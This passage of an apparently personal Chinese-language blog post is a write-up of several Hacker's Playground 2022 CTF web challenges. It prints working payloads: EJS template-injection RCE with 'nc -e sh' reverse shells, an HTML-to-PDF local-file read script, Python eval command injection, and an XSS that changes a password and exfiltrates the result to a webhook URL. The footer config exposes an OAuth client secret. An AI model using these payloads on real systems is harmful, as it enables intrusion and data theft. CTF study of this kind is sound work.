class="string">&#x27;papers.xml&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Forbidden&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;idx&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Invalid Request&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$idx</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;idx&#x27;</span>];</span><br><span class="line">        <span class="variable">$paper</span> = <span class="title function_ invoke__">getDetail</span>(<span class="variable">$papers</span>, <span class="variable">$idx</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$paper</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="JWT-Decoder"><a href="#JWT-Decoder" class="headerlink" title="JWT Decoder"></a>JWT Decoder</h2><h3 id="原型链污染的失败尝试（胡言乱语请直接看solution"><a href="#原型链污染的失败尝试（胡言乱语请直接看solution" class="headerlink" title="原型链污染的失败尝试（胡言乱语请直接看solution"></a>原型链污染的失败尝试（胡言乱语请直接看solution</h3><p>要先打一个原型链污染</p>
+<p>只有JWT这一个输入的地方</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220822233219673.png" alt="image-20220822233219673"></p>
+<p>怎么说 现在 part0 和 part1 都是进行相同的处理</p>
+<p>唯独 jwtSignature 没有做处理  然后执行了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jwtSignature = jwtPart[<span class="number">2</span>];</span><br><span class="line">rawJwt.<span class="property">signature</span> = jwtSignature;</span><br></pre></td></tr></table></figure>
+
+<p>而我们的ejs 想要执行命令的条件是</p>
+<p>我们要能控制 rawJwt 才行 貌似可以试试</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="keyword">render</span>(<span class="string">&#x27;index&#x27;</span>, rawJwt);</span><br></pre></td></tr></table></figure>
+
+<p>我要是能注入这个参数就行了</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003059974.png" alt="image-20220823003059974"></p>
+<p>header 和 body 我们必须要能够控制其中之一</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003234438.png" alt="image-20220823003234438"></p>
+<p><strong>但是我们必须要想办法控制键</strong> 很烦</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003343541.png" alt="image-20220823003343541"></p>
+<p>应该是在这里大显神威了</p>
+<p>之前corctf</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823004128051.png" alt="image-20220823004128051"></p>
+<p>所以我想 这个cookieParser 会不会有相同的操作</p>
+<p>能变个object传进去</p>
+<p><del>应该只有这个parse 有搞头了</del></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure>
+
+<p>左思右想 这里也不符合对象克隆。。。</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823013122267.png" alt="image-20220823013122267"></p>
+<p>没什么机会</p>
+<h3 id="CVE-2022-29078"><a href="#CVE-2022-29078" class="headerlink" title="CVE-2022-29078"></a>CVE-2022-29078</h3><p><a target="_blank" rel="noopener" href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">EJS, Server side template injection RCE (CVE-2022-29078) - writeup | ~#whoami </a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">render</span> = <span class="keyword">function</span> (<span class="params">template, d, o</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = d || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> opts = o || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// No options object -- if there are optiony names</span></span><br><span class="line">  <span class="comment">// in the data, copy them to options</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">2</span>) &#123;</span><br><span class="line">    utils.<span class="title function_">shallowCopyFromList</span>(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">handleCache</span>(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>data 和 options 通过<code>utils.shallowCopyFromList</code> 函数被 merge 了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">shallowCopyFromList</span> = <span class="keyword">function</span> (<span class="params">to, <span class="keyword">from</span>, list</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> p = list[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">from</span>[p] != <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">      to[p] = <span class="keyword">from</span>[p];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> to;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>接下来看个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;page&#x27;</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>rce</p>
+<p><code>renderFile</code> function</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Undocumented after Express 2, but still usable, esp. for</span></span><br><span class="line"><span class="comment">// items that are unsafe to be passed along with data, like `root`</span></span><br><span class="line">viewOpts = data.<span class="property">settings</span>[<span class="string">&#x27;view options&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (viewOpts) &#123;</span><br><span class="line">    utils.<span class="title function_">shallowCopy</span>(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>view options</code> ejs will copy everything into the options without restrictions</p>
+<p>what we need is just to find option included in the template body without escaping</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/page?id=2&amp;settings</span>[<span class="string">view options</span>][<span class="string">outputFunctionName</span>]=x;process.mainModule.require(<span class="emphasis">&#x27;child_process&#x27;</span>).execSync(<span class="emphasis">&#x27;dir&#x27;</span>);s</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/page?id=2&amp;settings</span>[<span class="string">view options</span>][<span class="string">outputFunctionName</span>]=x;process.mainModule.require(<span class="emphasis">&#x27;child_process&#x27;</span>).execSync(<span class="emphasis">&#x27;nc -e sh 127.0.0.1 1337&#x27;</span>);s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823002933085.png" alt="image-20220823002933085"></p>
+<p>现在必须要找一个原型链污染 cccccc</p>
+<h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>好了 我们现在已经知道了 想要 rce 就要去控制这个参数 </p>
+<p>但是我们怎么才能去加一个参数呢 从corctf 我们得到了经验 – 如果能通过框架或者某个库来将我们的输入转化成一个object 那我们就有机会</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003343541.png" alt="image-20220823003343541"></p>
+<p>然后我们恰巧有一个没有被过滤的部分    而最有可能出问题的地方就在这里 <code>const cookieParser = require(&#39;cookie-parser&#39;);</code>（这也是这题为什么不直接让你输入 而是让你从cookie输入的原因  如果当时有个师傅跟我讨论下 我可能就不会范这么sb的失误。。。</p>
+<p>然后我们来跟一下 来看看他到底是怎么处理的cookie</p>
+<img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220823225017630.png" alt="image-20220823225017630" style="zoom:50%;">
+
+<p>看到这里我们可以看到 这里对JSON类型的cookie有着单独的处理</p>
+<p>我们接着去跟进一下</p>
+<img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220823225116691.png" alt="image-20220823225116691" style="zoom:50%;">
+
+<p>可以看到 这里先调用了 <code>JSONCookies</code> 函数 然后又调用了 <code>JSONCookie</code> 函数</p>
+<p>可见 如果以 <code>j:</code> 开头的话    就可以将我们的cookie以json的方式来解析 以获得一个 <code>object</code></p>
+<p>然后我们就可以去构造 payload 了</p>
+<p>原payload</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/page?id=2&amp;settings</span>[<span class="string">view options</span>][<span class="string">outputFunctionName</span>]=x;process.mainModule.require(<span class="emphasis">&#x27;child_process&#x27;</span>).execSync(<span class="emphasis">&#x27;nc -e sh 127.0.0.1 1337&#x27;</span>);s</span><br></pre></td></tr></table></figure>
+
+<p>构造的payload</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Cookie:</span> jwt = j:&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;view options&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;nc -e sh 127.0.0.1 1337&#x27;);s&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们发现一个小问题 要对<code>;</code>进行编码</p>
+<p>首先来试试url编码</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823230543675.png" alt="image-20220823230543675"></p>
+<p>可以看到 <code>;</code> 已经传了进来</p>
+<p>然后监听的端口成功收到</p>
+<h2 id="OnlineEducation"><a href="#OnlineEducation" class="headerlink" title="OnlineEducation"></a>OnlineEducation</h2><blockquote>
+<p>I made an online education service!</p>
+<p>Watching education videos is so boring :(</p>
+<p>Server: <a target="_blank" rel="noopener" href="http://onlineeducation.sstf.site/">http://onlineeducation.sstf.site</a></p>
+<p>Download: OnlineEducation.zip</p>
+</blockquote>
+<p>貌似这玩意只和 <code>is_admin</code> 有关？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_name</span>(<span class="params">name</span>):</span><br><span class="line">    charset = string.ascii_letters + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            flash(<span class="string">&quot;Invalid Name&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>限制<code>name</code> 没啥意思</p>
+<p>目前的思路</p>
+<ol>
+<li>估计是要读文件搞到 <code>admin_hash</code>  SSTI之类的</li>
+<li>想办法污染<code>is_admin</code> 参数</li>
+</ol>
+<p>这里有个奇怪的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_certificate</span>(<span class="params">name, email, course, author</span>):</span><br><span class="line">    date = time.strftime(<span class="string">&#x27;%d, %b, %Y&#x27;</span>, time.localtime())</span><br><span class="line">    html = template.<span class="built_in">format</span>(name, email, course, author, date)</span><br><span class="line">    options = &#123;<span class="string">&#x27;orientation&#x27;</span>: <span class="string">&#x27;landscape&#x27;</span>, <span class="string">&#x27;page-size&#x27;</span>: <span class="string">&#x27;B6&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># Cool! HTML to PDF</span></span><br><span class="line">    pdf = pdfkit.from_string(html, options=options)</span><br><span class="line">    <span class="keyword">return</span> pdf</span><br></pre></td></tr></table></figure>
+
+<p>然后我们看到  <code>from_string</code> 里的 html 参数可控</p>
+<p>可以看一下我们到底能控制哪几个？</p>
+<p>然后发现只有 <code>name</code>,<code>email</code> 可控</p>
+<p>然后看看有哪些过滤</p>
+<img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220824011132772.png" alt="image-20220824011132772" style="zoom:50%;">
+
+<p>然后发现有个  看看这两个过滤会不会出啥问题</p>
+<p>然后发现这个email后面可以加任意的东西</p>
+<img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220824011901839.png" alt="image-20220824011901839" style="zoom:50%;">
+
+<p>所以 我想看一下 这里能不能利用一下</p>
+<p>先查一下这个函数 <a target="_blank" rel="noopener" href="https://pypi.org/project/pdfkit/">https://pypi.org/project/pdfkit/</a></p>
+<p>跟一下 文档说的也不是很清楚 看看有没有啥读文件功能之类的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ses = requests.session()</span><br><span class="line">ses.proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;10.0.20.1:8080&#x27;</span>&#125;</span><br><span class="line">baseurl = <span class="string">&#x27;http://onlineeducation.sstf.site&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;script&gt;</span></span><br><span class="line"><span class="string">function qwq()&#123;</span></span><br><span class="line"><span class="string">  document.write(this.responseText); </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var r = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">r.addEventListener(&quot;load&quot;, qwq);</span></span><br><span class="line"><span class="string">r.open(&quot;GET&quot;, &quot;file:///home/app/config.py&quot;);</span></span><br><span class="line"><span class="string">r.send()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ses.post(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/signin&#x27;</span>, data=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;qwq&#x27;</span>, <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;qwq@qq.com&#x27;</span>+payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    ses.post(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/status&#x27;</span>, json=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;start&#x27;</span>&#125;)</span><br><span class="line">    ses.post(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/status&#x27;</span>, json=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;finish&#x27;</span>, <span class="string">&#x27;rate&#x27;</span>: -<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">req = ses.get(<span class="string">f&#x27;<span class="subst">&#123;baseurl&#125;</span>/cert&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./1.pdf&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(req.content)</span><br></pre></td></tr></table></figure>
+
+<p>然后可以读本地文件</p>
+<h2 id="Imageium"><a href="#Imageium" class="headerlink" title="Imageium"></a>Imageium</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//imag</span>eium.sstf.site/dynamic/modified?mode=__import_<span class="number">_</span>(%27os%27).popen(%27cat%20secret/*%27).read()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Datascience-Class"><a href="#Datascience-Class" class="headerlink" title="Datascience Class"></a>Datascience Class</h2><p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-datascience-class">https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-datascience-class</a></p>
+<blockquote>
+<p>不過就在我做到這邊的時候 seadog007 就已經用 <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a> 從其他隊伍那邊偷到 flag 了 XDDD，所以就沒繼續做下去。</p>
+</blockquote>
+<p>学到了 这tm是真的nb  orzzzzzzzzzzzzzzzzz</p>
+<p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220824020113565.png" alt="image-20220824020113565"></p>
+<p>可以直接执行xss</p>
+<p>大佬的payload  bot下线了好像 这样可以直接打  maple yyds</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%%html</span><br><span class="line">&lt;select&gt;&lt;iframe&gt;&lt;/select&gt;&lt;img src=x: onerror=<span class="string">&quot;fetch(&#x27;/hub/change-password&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;password=NEWPASSWORD&#x27;&#125;).then(r=&gt;r.text()).catch(err=&gt;err.message).then(t=&gt;fetch(&#x27;https://webhook.site/9ba401b3-763f-4926-870e-0174490b91aa&#x27;,&#123;method:&#x27;POST&#x27;,body:t&#125;))</span></span><br><span class="line"><span class="string">&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="OnlineNotepad"><a href="#OnlineNotepad" class="headerlink" title="OnlineNotepad"></a>OnlineNotepad</h2><blockquote>
+<p>Online Notepad is a free notepad! Please read the admin’s memo.</p>
+</blockquote>
+<p>有点累了 直接看wp了 不想复现了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-onlinenotepad">https://blog.maple3142.net/2022/08/23/hackers-playground-2022-writeups/#web-onlinenotepad</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>读源码时要更认真 深入</li>
+<li>xss有点生疏了 要常做</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/08/22/palygroundctf2022/" title="palygroundctf2022 writeup">http://example.com/2022/08/22/palygroundctf2022/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/22/IOT-DVFR/" rel="prev" title="IOT-DVFR">
+                  <i class="fa fa-chevron-left"></i> IOT-DVFR
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"4da60aab7b80bb88a9211220be60c331"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
